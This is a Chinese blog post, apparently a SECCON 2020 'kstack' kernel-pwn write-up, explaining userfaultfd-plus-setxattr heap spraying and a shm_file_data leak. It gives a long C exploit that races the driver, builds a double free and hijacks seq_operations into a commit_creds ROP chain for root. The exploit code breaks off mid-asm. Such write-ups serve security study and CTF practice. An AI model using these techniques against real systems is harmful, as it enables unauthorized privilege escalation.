<h2 id="从seccon2020的kstack学习userfaultfd-setxattr技术和shm-file-data结构体"><a href="#从seccon2020的kstack学习userfaultfd-setxattr技术和shm-file-data结构体" class="headerlink" title="从seccon2020的kstack学习userfaultfd+setxattr技术和shm_file_data结构体"></a>从seccon2020的kstack学习userfaultfd+setxattr技术和shm_file_data结构体</h2><p>本题也出现了打包文件系统后qemu启动不起来的问题，所以换了其他题的文件系统。<br>userfaultfd技术前面已经提过一次，是为分配的匿名页注册userfaultfd的handler句柄，这样在第一次访问这个页面的时候触发缺页异常然后运行我们注册的handler。（但是新版本的内核已经将userfaultfd的权限调整为root权限，所以应该用不了了，但是出现了FUSE race的方法，接下来的文章应该会讲）。<br>这里主要学习一下setxattr技术，可以参考<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#setxattr-userfaultfd-%E5%A0%86%E5%8D%A0%E4%BD%8D%E6%8A%80%E6%9C%AF">arttnba3师傅</a>的博客。<br>setxattr在内核利用中可以为我们提供几乎任意大小的内核空间对象的分配。setxattr的调用链如下</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">SYS_setxattr</span>()</span><br>    <span class="hljs-function"><span class="hljs-title">path_setxattr</span>()</span><br>        <span class="hljs-function"><span class="hljs-title">setxattr</span>()</span><br></code></pre></td></tr></table></figure>
<p>在 setxattr() 函数中有如下逻辑：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">long</span></span><br><span class="hljs-function"><span class="hljs-title">setxattr</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dentry *d, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *name, <span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *value,</span></span><br><span class="hljs-params"><span class="hljs-function">     <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> flags)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//...</span><br>        kvalue = <span class="hljs-built_in">kvmalloc</span>(size, GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!kvalue)<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">copy_from_user</span>(kvalue, value, size)) &#123;<br><br>    <span class="hljs-comment">//,..</span><br><br>    <span class="hljs-built_in">kvfree</span>(kvalue);<br><br>    <span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure>


<p>我们可以直接在用户态调用setxattr函数，形如<code>setxattr(&quot;/flag&quot;, &quot;7c00&quot;, uffd_buf_hack + page_size - 8, 32, 0);</code>，其中第一个参数必须是一个存在的文件路径，value为我们要复制的起始地址，size为我们指定的大小，所以有了这个函数我们可以分配任意大小的对象并向其中写入任意内容。</p>
<p>但是该对象在setxattr函数执行结束时会被放到freelist中，而我们不想释放它，所以我们要在copy_from_user处将其卡住，具体的方式为：</p>
<blockquote>
<p>我们通过 mmap 分配连续的两个页面，在第二个页面上启用 userfaultfd，并在第一个页面的末尾写入我们想要的数据，此时我们调用 setxattr 进行跨页面的拷贝，当 copy_from_user 拷贝到第二个页面时便会触发 userfaultfd，从而让 setxattr 的执行流程卡在此处，这样这个 object 就不会被释放掉，而是可以继续参与我们接下来的利用</p>
</blockquote>
<p><img src="https://i.imgur.com/RXKBMCI.png" srcset="/img/loading.gif" lazyload><br>图片和文字来源<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#setxattr-userfaultfd-%E5%A0%86%E5%8D%A0%E4%BD%8D%E6%8A%80%E6%9C%AF">arttnba3师傅</a></p>
<p>shm_file_data结构体可以参考一下<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x06-shm-file-data-%E4%B8%8E%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98%E7%9B%B8%E5%85%B3">arttnba3师傅</a></p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">struct</span> <span class="hljs-type">shm_file_data</span> &#123;<br>    int id;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-type">ipc_namespace</span> *ns;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-type">file</span> *file;<br>    const <span class="hljs-keyword">struct</span> <span class="hljs-type">vm_operations_struct</span> *vm_ops;<br>&#125;;<br></code></pre></td></tr></table></figure>
<p>在 Linux 当中有一种 IPC 技术名为共享内存，在用户态中我们可以通过 shmget、shmat、shmctl、shmdt 这四个系统调用操纵共享内存。使用 shmget 系统调用可以获得一个共享内存对象，随后要使用 shmat 系统调用将共享内存对象映射到进程的地址空间，在该系统调用中调用了 do_shmat() 函数</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-built_in">long</span> <span class="hljs-title">do_shmat</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> shmid, <span class="hljs-built_in">char</span> __user *shmaddr, <span class="hljs-built_in">int</span> shmflg,</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-built_in">ulong</span> *raddr, unsigned <span class="hljs-built_in">long</span> shmlba</span>)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>    <span class="hljs-keyword">struct</span> shm_file_data *sfd;<br><br><span class="hljs-comment">//...</span><br><br>    sfd = kzalloc(<span class="hljs-keyword">sizeof</span>(*sfd), GFP_KERNEL);<br><span class="hljs-comment">//...</span><br>    file-&gt;private_data = sfd;<br></code></pre></td></tr></table></figure>
<p>我们可以看到这里创建了shm_file_data结构体。<br>使用 shmdt 系统调用用以断开与共享内存对象的连接，最终会调用shm_release函数</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">static <span class="hljs-built_in">int</span> shm<span class="hljs-constructor">_release(<span class="hljs-params">struct</span> <span class="hljs-params">inode</span> <span class="hljs-operator">*</span><span class="hljs-params">ino</span>, <span class="hljs-params">struct</span> <span class="hljs-params">file</span> <span class="hljs-operator">*</span><span class="hljs-params">file</span>)</span><br>&#123;<br>    <span class="hljs-keyword">struct</span> shm_file_data *sfd = shm<span class="hljs-constructor">_file_data(<span class="hljs-params">file</span>)</span>;<br><br>    put<span class="hljs-constructor">_ipc_ns(<span class="hljs-params">sfd</span>-&gt;<span class="hljs-params">ns</span>)</span>;<br>    fput(sfd-&gt;file);<br>    shm<span class="hljs-constructor">_file_data(<span class="hljs-params">file</span>)</span> = NULL;<br>    kfree(sfd);<br>    return <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>从而将申请的shm_file_data结构体释放掉</p>
<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>我们直接来看题目源码，源码实现了PUSH和POP功能，并且没有加锁，所以就存在竞争问题。<br>我们利用的方式主要分三步(1)泄露内核基址：shm_file_data（2）构造double_free（3）userfaultfd + setxattr 劫持 seq_operations 控制内核执行流</p>
<p><strong>第一步</strong>：<br>首先要泄露内核基址，题目源码中sizeof(Element)的大小为0x20，这里我们选择shm_file_data结构体也是0x20大小。<br>我们首先申请shm_file_data结构体，然后再释放。然后再调用PUSH申请一个sizeof(Element)0x20大小的对象，此时这个对象指向的位置就是shm_file_data结构体的位置。此时在PUSH的过程中会卡在copy_from_user的位置然后去执行我们注册的handler句柄，而在我们注册的handler句柄中我们可以POP，因为此时head指向的是shm_file_data结构体，<code>tmp-&gt;value</code>即是shm_file_data的ns域，泄露它即泄露了内核基址。</p>
<p><strong>第二步</strong>：<br>构造double free，主要是为了修改seq_operations的start函数指针。这里double free的是我们申请的<code>kmalloc(sizeof(Element), GFP_KERNEL);</code>。 pop 时通过 copy_to_user 触发 userfaultfd，在 userfaultfd 线程中再 pop 一次即可</p>
<p><strong>第三步</strong>：<br>有了第二步构造的double free，我们可以先分配一个seq_operations结构体，然后再setxattr一个0x20大小的对象，此时这两个对象指向的是同一个空间。然后我们先申请两个页面，在第一个页面的末尾填入我们的gadget，此时我们在setxattr函数的内部往我们申请的0x20大小的结构体进行copy的时候出现了异常，只copy了8个字节将seq_operations的start函数指针覆盖掉了，然后调用我们注册的handler句柄，调用read函数执行gadget，这里的gadget是add rsp， val的形式，具体怎么确定val可以看前面的文章，可以在gadget上下断点，然后看和pt_regs中的ROP链的差值。说一下这里为什么不用填入用户态保存的rip，rflags，cs之类的寄存器，原因是<code>swapgs_restore_regs_and_return_to_usermode;</code>函数中有几个push语句，又把这些值push进来了，所以题解中构造的这种ROP也可以成功返回用户态。</p>
<p>EXP</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/xattr.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-type">int</span>             dev_fd;<br><span class="hljs-type">size_t</span>          seq_fd;<br><span class="hljs-type">size_t</span>          seq_fd_reserve[<span class="hljs-number">0x100</span>];<br><span class="hljs-type">static</span> <span class="hljs-type">char</span>     *page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span>   page_size;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">leak_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffd_msg</span> msg;<br>    <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_copy</span> uffdio_copy;<br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">pollfd</span> pollfd;<br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = <span class="hljs-built_in">poll</span>(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = <span class="hljs-built_in">read</span>(uffd, &amp;msg, <span class="hljs-built_in">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] push trapped in userfaultfd.&quot;</span>);<br>        <span class="hljs-built_in">pop</span>(&amp;kernel_offset);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak ptr: %p\n&quot;</span>, kernel_offset);<br>        kernel_offset -= <span class="hljs-number">0xffffffff81c37bc0</span>;<br>        kernel_base += kernel_offset;<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">double_free_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffd_msg</span> msg;<br>    <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_copy</span> uffdio_copy;<br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">pollfd</span> pollfd;<br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = <span class="hljs-built_in">poll</span>(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = <span class="hljs-built_in">read</span>(uffd, &amp;msg, <span class="hljs-built_in">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pop trapped in userfaultfd.&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct the double free...&quot;</span>);<br>        <span class="hljs-built_in">pop</span>(page);<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">size_t</span>  pop_rdi_ret = <span class="hljs-number">0xffffffff81034505</span>;<br><span class="hljs-type">size_t</span>  xchg_rax_rdi_ret = <span class="hljs-number">0xffffffff81d8df6d</span>;<br><span class="hljs-type">size_t</span>  mov_rdi_rax_pop_rbp_ret = <span class="hljs-number">0xffffffff8121f89a</span>;<br><span class="hljs-type">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81600a34</span>;<br><span class="hljs-type">long</span>    flag_fd;<br><span class="hljs-type">char</span>    flag_buf[<span class="hljs-number">0x100</span>];<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">hijack_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffd_msg</span> msg;<br>    <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_copy</span> uffdio_copy;<br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">pollfd</span> pollfd;<br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = <span class="hljs-built_in">poll</span>(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = <span class="hljs-built_in">read</span>(uffd, &amp;msg, <span class="hljs-built_in">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] setxattr trapped in userfaultfd.&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger now...&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)<br>            <span class="hljs-built_in">close</span>(seq_fd_reserve[i]);<br><br>        <span class="hljs-comment">// trigger</span><br>        pop_rdi_ret += kernel_offset;<br>        xchg_rax_rdi_ret += kernel_offset;<br>        mov_rdi_rax_pop_rbp_ret += kernel_offset;<br>        prepare_kernel_cred = <span class="hljs-number">0xffffffff81069e00</span> + kernel_offset;<br>        commit_creds = <span class="hljs-number">0xffffffff81069c10</span> + kernel_offset;<br>        swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="hljs-number">0x10</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] gadget: %p\n&quot;</span>, swapgs_restore_regs_and_return_to_usermode);<br>        __asm__(<br>            <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>            <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>            <span class="hljs-string">&quot;mov r13,   pop_rdi_ret;&quot;</span><br>            <span class="hljs-string">&quot;mov r12,   0;&quot;</span><br>            <span class="hljs-string">&quot;mov rbp,   prepare_kernel_cred;&quot;</span><br>            <span class="hljs-string">&quot;mov rbx,   mov_rdi_rax_pop_rbp_ret;&quot;</span>    <br>            <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>            <span class="hljs-string">&quot;mov r10,   commit_creds;&quot;</span><br>            <span class="hljs-string">&quot;mov r9,    swapgs_restore_regs_and_return_to_usermode;&quot;</span><br>            <span class="hljs-string">&quot;mov r8,    0x99999999;&quot;</span><br>            <span class="hljs-string">&quot;xor rax,   rax;&quot;</span><br>            <span 